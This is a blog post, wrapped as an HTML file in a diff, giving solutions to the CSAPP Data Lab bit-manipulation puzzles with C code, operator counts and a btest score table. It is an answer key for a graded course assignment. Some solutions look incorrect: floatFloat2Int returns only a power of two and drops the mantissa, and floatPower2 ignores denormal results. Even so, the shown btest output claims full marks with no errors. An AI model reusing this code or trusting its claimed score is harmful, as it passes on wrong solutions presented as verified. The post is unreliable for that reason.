@@ -1,0 +1,2563 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='无情的ctrl&#43;c ctrl&#43;v机器'><title>CSAPP Labs</title>
+
+<link rel='canonical' href='/post/csapp-labs/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='CSAPP Labs'>
+<meta property='og:description' content='无情的ctrl&#43;c ctrl&#43;v机器'>
+<meta property='og:url' content='/post/csapp-labs/'>
+<meta property='og:site_name' content='s0uthwood&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='System' /><meta property='article:tag' content='Reverse' /><meta property='article:tag' content='Pwn' /><meta property='article:tag' content='Labs' /><meta property='article:published_time' content='2022-10-12T00:19:32&#43;08:00'/><meta property='article:modified_time' content='2022-10-12T00:19:32&#43;08:00'/><meta property='og:image' content='/post/csapp-labs/cover.jpg' />
+<meta name="twitter:title" content="CSAPP Labs">
+<meta name="twitter:description" content="无情的ctrl&#43;c ctrl&#43;v机器"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='/post/csapp-labs/cover.jpg' />
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>Back</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/post/csapp-labs/">
+                <img src="/post/csapp-labs/cover_hu3b8d692d45d6b215e59701d25ac88074_3319905_800x0_resize_q75_box.jpg"
+                        srcset="/post/csapp-labs/cover_hu3b8d692d45d6b215e59701d25ac88074_3319905_800x0_resize_q75_box.jpg 800w, /post/csapp-labs/cover_hu3b8d692d45d6b215e59701d25ac88074_3319905_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="417" 
+                        loading="lazy"
+                        alt="Featured image of post CSAPP Labs" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/labs/" >
+                Labs
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/post/csapp-labs/">CSAPP Labs</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        无情的ctrl&#43;c ctrl&#43;v机器
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 12, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    44 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h2 id="lab1-data-lab">Lab1 Data-lab</h2>
+<h3 id="bitxor">bitXor</h3>
+<p>用 <code>~</code> 和 <code>&amp;</code> 进行异或运算，简单离散数学</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* 
+</span><span style="color:#75715e"> * bitXor - x^y using only ~ and &amp; 
+</span><span style="color:#75715e"> *   Example: bitXor(4, 5) = 1
+</span><span style="color:#75715e"> *   Legal ops: ~ &amp;
+</span><span style="color:#75715e"> *   Max ops: 14
+</span><span style="color:#75715e"> *   Rating: 1
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">bitXor</span>(<span style="color:#66d9ef">int</span> x, <span style="color:#66d9ef">int</span> y) {
+  <span style="color:#66d9ef">return</span> <span style="color:#f92672">~</span>(<span style="color:#f92672">~</span>(<span style="color:#f92672">~</span>x <span style="color:#f92672">&amp;</span> y) <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>(x <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>y));
+}
+</code></pre></div><h3 id="tmin">tmin</h3>
+<p>要求返回补码中最小的整数</p>
+<p>众所周知补码形式下最小数为0x80000000，由于使用的常数不能超过 0xff，所以需要使用左移运算生成</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* 
+</span><span style="color:#75715e"> * tmin - return minimum two&#39;s complement integer 
+</span><span style="color:#75715e"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;
+</span><span style="color:#75715e"> *   Max ops: 4
+</span><span style="color:#75715e"> *   Rating: 1
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">tmin</span>(<span style="color:#66d9ef">void</span>) {
+  <span style="color:#66d9ef">return</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">31</span>);
+}
+</code></pre></div><h3 id="istmax">isTmax</h3>
+<p>判断 x 是否为补码格式下的最大数字</p>
+<p>满足 <code>(~x) ^ (x + 1)</code> 为 0 的只有 0x7fffffff 和 0xffffffff</p>
+<p>所以需要再用 <code>!!(~x)</code> 排除一下 0xffffffff</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/*
+</span><span style="color:#75715e"> * isTmax - returns 1 if x is the maximum, two&#39;s complement number,
+</span><span style="color:#75715e"> *     and 0 otherwise 
+</span><span style="color:#75715e"> *   Legal ops: ! ~ &amp; ^ | +
+</span><span style="color:#75715e"> *   Max ops: 10
+</span><span style="color:#75715e"> *   Rating: 1
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">isTmax</span>(<span style="color:#66d9ef">int</span> x) {
+  <span style="color:#66d9ef">return</span> <span style="color:#f92672">!</span>((<span style="color:#f92672">~</span>x) <span style="color:#f92672">^</span> (x <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#f92672">!!</span>(<span style="color:#f92672">~</span>x);
+}
+</code></pre></div><h3 id="alloddbits">allOddBits</h3>
+<p>其实就是返回 <code>x &amp; 0xaaaaaaaa == 0xaaaaaaaa</code></p>
+<p>但由于常数不能超过 0xff，所以可以用右移运算来进行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* 
+</span><span style="color:#75715e"> * allOddBits - return 1 if all odd-numbered bits in word set to 1
+</span><span style="color:#75715e"> *   where bits are numbered from 0 (least significant) to 31 (most significant)
+</span><span style="color:#75715e"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1
+</span><span style="color:#75715e"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;
+</span><span style="color:#75715e"> *   Max ops: 12
+</span><span style="color:#75715e"> *   Rating: 2
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">allOddBits</span>(<span style="color:#66d9ef">int</span> x) {
+  x <span style="color:#f92672">&amp;=</span> x <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">16</span>;
+  x <span style="color:#f92672">&amp;=</span> x <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span>;
+  <span style="color:#66d9ef">return</span> <span style="color:#f92672">!</span>((x <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xAA</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xAA</span>);
+}
+</code></pre></div><h3 id="negate">negate</h3>
+<p>使用位运算和加法表示 <code>-x</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* 
+</span><span style="color:#75715e"> * negate - return -x 
+</span><span style="color:#75715e"> *   Example: negate(1) = -1.
+</span><span style="color:#75715e"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;
+</span><span style="color:#75715e"> *   Max ops: 5
+</span><span style="color:#75715e"> *   Rating: 2
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">negate</span>(<span style="color:#66d9ef">int</span> x) {
+  <span style="color:#66d9ef">return</span> <span style="color:#f92672">~</span>x <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+}
+</code></pre></div><h3 id="isasciidigit">isAsciiDigit</h3>
+<p><code>0x30 - 0x39</code> 之间的数字返回 1</p>
+<p>根据共同点，先忽略个位，验证是否满足 <code>0x0000003?</code></p>
+<p>随后只提取最后一位 <code>x</code>，判断 <code>x + 6</code> 后是否超过 <code>0x10</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* 
+</span><span style="color:#75715e"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#39;0&#39; to &#39;9&#39;)
+</span><span style="color:#75715e"> *   Example: isAsciiDigit(0x35) = 1.
+</span><span style="color:#75715e"> *            isAsciiDigit(0x3a) = 0.
+</span><span style="color:#75715e"> *            isAsciiDigit(0x05) = 0.
+</span><span style="color:#75715e"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;
+</span><span style="color:#75715e"> *   Max ops: 15
+</span><span style="color:#75715e"> *   Rating: 3
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">isAsciiDigit</span>(<span style="color:#66d9ef">int</span> x) {
+  <span style="color:#66d9ef">return</span> (<span style="color:#f92672">!</span>((x <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x3</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#f92672">!</span>(((x <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xf</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span>);
+}
+</code></pre></div><h3 id="conditional">conditional</h3>
+<p>要实现一个三目运算</p>
+<p>先将 <code>x</code> 转换为 <code>0</code> 或 <code>0xffffffff</code></p>
+<p>然后再使用位运算进行输出</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">conditional</span>(<span style="color:#66d9ef">int</span> x, <span style="color:#66d9ef">int</span> y, <span style="color:#66d9ef">int</span> z) {
+  x <span style="color:#f92672">=</span> <span style="color:#f92672">~!</span>x <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>; <span style="color:#75715e">// if x != 0 -&gt; x = 0
+</span><span style="color:#75715e"></span>               <span style="color:#75715e">// if x == 0 -&gt; x = 0xffffffff
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> (<span style="color:#f92672">~</span>x <span style="color:#f92672">&amp;</span> y) <span style="color:#f92672">|</span> (x <span style="color:#f92672">&amp;</span> z);
+}
+</code></pre></div><h3 id="islessorequal">isLessOrEqual</h3>
+<p>判断 x 是否小于等于 y</p>
+<p>判断相减后是否大于 0 即可，用位运算代替减法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* 
+</span><span style="color:#75715e"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 
+</span><span style="color:#75715e"> *   Example: isLessOrEqual(4,5) = 1.
+</span><span style="color:#75715e"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;
+</span><span style="color:#75715e"> *   Max ops: 24
+</span><span style="color:#75715e"> *   Rating: 3
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">isLessOrEqual</span>(<span style="color:#66d9ef">int</span> x, <span style="color:#66d9ef">int</span> y) {
+  y <span style="color:#f92672">+=</span> <span style="color:#f92672">~</span>x <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+  <span style="color:#66d9ef">return</span> <span style="color:#f92672">!</span>(y <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">31</span>);
+}
+</code></pre></div><h3 id="logicalneg">logicalNeg</h3>
+<p>利用位运算实现 <code>!</code></p>
+<blockquote>
+<p>在int型的右移运算中，正数会在开头补 0，而负数则会在开头补 1</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* 
+</span><span style="color:#75715e"> * logicalNeg - implement the ! operator, using all of 
+</span><span style="color:#75715e"> *              the legal operators except !
+</span><span style="color:#75715e"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1
+</span><span style="color:#75715e"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;
+</span><span style="color:#75715e"> *   Max ops: 12
+</span><span style="color:#75715e"> *   Rating: 4 
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">logicalNeg</span>(<span style="color:#66d9ef">int</span> x) {
+  <span style="color:#75715e">// In right shift, negative number will fixed with 1 at MSB.
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> (((<span style="color:#f92672">~</span>x <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">|</span> x) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">31</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+}
+</code></pre></div><h3 id="howmanybits">howManyBits</h3>
+<p>计算多少位可以表示一个数</p>
+<p>还是利用右移运算进行二分</p>
+<p>由于需要预留符号位，最后需要 <code>+1</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* howManyBits - return the minimum number of bits required to represent x in
+</span><span style="color:#75715e"> *             two&#39;s complement
+</span><span style="color:#75715e"> *  Examples: howManyBits(12) = 5
+</span><span style="color:#75715e"> *            howManyBits(298) = 10
+</span><span style="color:#75715e"> *            howManyBits(-5) = 4
+</span><span style="color:#75715e"> *            howManyBits(0)  = 1
+</span><span style="color:#75715e"> *            howManyBits(-1) = 1
+</span><span style="color:#75715e"> *            howManyBits(0x80000000) = 32
+</span><span style="color:#75715e"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;
+</span><span style="color:#75715e"> *  Max ops: 90
+</span><span style="color:#75715e"> *  Rating: 4
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">howManyBits</span>(<span style="color:#66d9ef">int</span> x) {
+  <span style="color:#66d9ef">int</span> sign, b <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, cur;
+  sign <span style="color:#f92672">=</span> x <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">31</span>;
+  sign <span style="color:#f92672">=</span> <span style="color:#f92672">~!</span>sign <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+  x <span style="color:#f92672">=</span> (<span style="color:#f92672">~</span>x <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>sign) <span style="color:#f92672">|</span> (x <span style="color:#f92672">&amp;</span> sign);
+  cur <span style="color:#f92672">=</span> <span style="color:#f92672">!!</span>(x <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">16</span>) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>;
+  x <span style="color:#f92672">&gt;&gt;=</span> cur;
+  b <span style="color:#f92672">+=</span> cur;
+  cur <span style="color:#f92672">=</span> <span style="color:#f92672">!!</span>(x <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">3</span>;
+  x <span style="color:#f92672">&gt;&gt;=</span> cur;
+  b <span style="color:#f92672">+=</span> cur;
+  cur <span style="color:#f92672">=</span> <span style="color:#f92672">!!</span>(x <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">2</span>;
+  x <span style="color:#f92672">&gt;&gt;=</span> cur;
+  b <span style="color:#f92672">+=</span> cur;
+  cur <span style="color:#f92672">=</span> <span style="color:#f92672">!!</span>(x <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>;
+  x <span style="color:#f92672">&gt;&gt;=</span> cur;
+  b <span style="color:#f92672">+=</span> cur;
+  cur <span style="color:#f92672">=</span> <span style="color:#f92672">!!</span>(x <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">1</span>);
+  x <span style="color:#f92672">&gt;&gt;=</span> cur;
+  b <span style="color:#f92672">+=</span> cur <span style="color:#f92672">+</span> x;
+  <span style="color:#66d9ef">return</span> b <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+}
+</code></pre></div><h3 id="floatscale2">floatScale2</h3>
+<p>后面几个是浮点数相关操作</p>
+<p>计算 <code>f*2</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* 
+</span><span style="color:#75715e"> * floatScale2 - Return bit-level equivalent of expression 2*f for
+</span><span style="color:#75715e"> *   floating point argument f.
+</span><span style="color:#75715e"> *   Both the argument and result are passed as unsigned int&#39;s, but
+</span><span style="color:#75715e"> *   they are to be interpreted as the bit-level representation of
+</span><span style="color:#75715e"> *   single-precision floating point values.
+</span><span style="color:#75715e"> *   When argument is NaN, return argument
+</span><span style="color:#75715e"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while
+</span><span style="color:#75715e"> *   Max ops: 30
+</span><span style="color:#75715e"> *   Rating: 4
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">unsigned</span> <span style="color:#a6e22e">floatScale2</span>(<span style="color:#66d9ef">unsigned</span> uf) {
+  <span style="color:#66d9ef">int</span> sign <span style="color:#f92672">=</span> uf <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">31</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">31</span>;
+  <span style="color:#66d9ef">if</span> ((uf <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">return</span> uf;
+  <span style="color:#66d9ef">if</span> (((uf <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">23</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xff</span>) <span style="color:#66d9ef">return</span> uf;
+  <span style="color:#66d9ef">if</span> (((uf <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">23</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">return</span> uf <span style="color:#f92672">+</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">23</span>);
+  <span style="color:#66d9ef">return</span> (uf <span style="color:#f92672">-</span> sign) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> sign;
+}
+</code></pre></div><h3 id="floatfloat2int">floatFloat2Int</h3>
+<p>保留 f 的整数部分</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* 
+</span><span style="color:#75715e"> * floatFloat2Int - Return bit-level equivalent of expression (int) f
+</span><span style="color:#75715e"> *   for floating point argument f.
+</span><span style="color:#75715e"> *   Argument is passed as unsigned int, but
+</span><span style="color:#75715e"> *   it is to be interpreted as the bit-level representation of a
+</span><span style="color:#75715e"> *   single-precision floating point value.
+</span><span style="color:#75715e"> *   Anything out of range (including NaN and infinity) should return
+</span><span style="color:#75715e"> *   0x80000000u.
+</span><span style="color:#75715e"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while
+</span><span style="color:#75715e"> *   Max ops: 30
+</span><span style="color:#75715e"> *   Rating: 4
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">floatFloat2Int</span>(<span style="color:#66d9ef">unsigned</span> uf) {
+  <span style="color:#66d9ef">int</span> e <span style="color:#f92672">=</span> ((uf <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">23</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">127</span>, sign <span style="color:#f92672">=</span> uf <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">31</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">31</span>, pow <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+  <span style="color:#66d9ef">if</span> (e <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">31</span>) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x80000000</span>;
+  <span style="color:#66d9ef">if</span> (e <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+  pow <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> e;
+  <span style="color:#66d9ef">if</span> (sign) pow <span style="color:#f92672">=</span> <span style="color:#f92672">~</span>pow <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+  <span style="color:#66d9ef">return</span> pow;
+}
+</code></pre></div><h3 id="floatpower2">floatPower2</h3>
+<p>计算 $2.0^x$</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* 
+</span><span style="color:#75715e"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x
+</span><span style="color:#75715e"> *   (2.0 raised to the power x) for any 32-bit integer x.
+</span><span style="color:#75715e"> *
+</span><span style="color:#75715e"> *   The unsigned value that is returned should have the identical bit
+</span><span style="color:#75715e"> *   representation as the single-precision floating-point number 2.0^x.
+</span><span style="color:#75715e"> *   If the result is too small to be represented as a denorm, return
+</span><span style="color:#75715e"> *   0. If too large, return +INF.
+</span><span style="color:#75715e"> * 
+</span><span style="color:#75715e"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while 
+</span><span style="color:#75715e"> *   Max ops: 30 
+</span><span style="color:#75715e"> *   Rating: 4
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">unsigned</span> <span style="color:#a6e22e">floatPower2</span>(<span style="color:#66d9ef">int</span> x) {
+    <span style="color:#66d9ef">if</span> (x <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x7f</span>) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0xff</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">23</span>;
+    <span style="color:#66d9ef">if</span> (x <span style="color:#f92672">&lt;</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x7e</span>) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; 
+    <span style="color:#66d9ef">return</span> (x <span style="color:#f92672">+</span> <span style="color:#ae81ff">127</span>) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">23</span>;
+}
+</code></pre></div><h3 id="result">result</h3>
+<p>先使用 <code>./dlc</code> 验证使用的操作是否满足要求</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./dlc -e bits.c
+dlc:bits.c:147:bitXor: <span style="color:#ae81ff">8</span> operators
+dlc:bits.c:156:tmin: <span style="color:#ae81ff">1</span> operators
+dlc:bits.c:167:isTmax: <span style="color:#ae81ff">8</span> operators
+dlc:bits.c:180:allOddBits: <span style="color:#ae81ff">7</span> operators
+dlc:bits.c:190:negate: <span style="color:#ae81ff">2</span> operators
+dlc:bits.c:203:isAsciiDigit: <span style="color:#ae81ff">8</span> operators
+dlc:bits.c:215:conditional: <span style="color:#ae81ff">7</span> operators
+dlc:bits.c:226:isLessOrEqual: <span style="color:#ae81ff">5</span> operators
+dlc:bits.c:239:logicalNeg: <span style="color:#ae81ff">5</span> operators
+dlc:bits.c:273:howManyBits: <span style="color:#ae81ff">40</span> operators
+dlc:bits.c:292:floatScale2: <span style="color:#ae81ff">15</span> operators
+dlc:bits.c:312:floatFloat2Int: <span style="color:#ae81ff">10</span> operators
+dlc:bits.c:330:floatPower2: <span style="color:#ae81ff">6</span> operators
+</code></pre></div><p>随后编译并执行 <code>./btest</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ make clean
+$ make btest
+$ ./btest
+Score   Rating  Errors  Function
+ <span style="color:#ae81ff">1</span>      <span style="color:#ae81ff">1</span>       <span style="color:#ae81ff">0</span>       bitXor
+ <span style="color:#ae81ff">1</span>      <span style="color:#ae81ff">1</span>       <span style="color:#ae81ff">0</span>       tmin
+ <span style="color:#ae81ff">1</span>      <span style="color:#ae81ff">1</span>       <span style="color:#ae81ff">0</span>       isTmax
+ <span style="color:#ae81ff">2</span>      <span style="color:#ae81ff">2</span>       <span style="color:#ae81ff">0</span>       allOddBits
+ <span style="color:#ae81ff">2</span>      <span style="color:#ae81ff">2</span>       <span style="color:#ae81ff">0</span>       negate
+ <span style="color:#ae81ff">3</span>      <span style="color:#ae81ff">3</span>       <span style="color:#ae81ff">0</span>       isAsciiDigit
+ <span style="color:#ae81ff">3</span>      <span style="color:#ae81ff">3</span>       <span style="color:#ae81ff">0</span>       conditional
+ <span style="color:#ae81ff">3</span>      <span style="color:#ae81ff">3</span>       <span style="color:#ae81ff">0</span>       isLessOrEqual
+ <span style="color:#ae81ff">4</span>      <span style="color:#ae81ff">4</span>       <span style="color:#ae81ff">0</span>       logicalNeg
+ <span style="color:#ae81ff">4</span>      <span style="color:#ae81ff">4</span>       <span style="color:#ae81ff">0</span>       howManyBits
+ <span style="color:#ae81ff">4</span>      <span style="color:#ae81ff">4</span>       <span style="color:#ae81ff">0</span>       floatScale2
+ <span style="color:#ae81ff">4</span>      <span style="color:#ae81ff">4</span>       <span style="color:#ae81ff">0</span>       floatFloat2Int
+ <span style="color:#ae81ff">4</span>      <span style="color:#ae81ff">4</span>       <span style="color:#ae81ff">0</span>       floatPower2
+Total points: 36/36
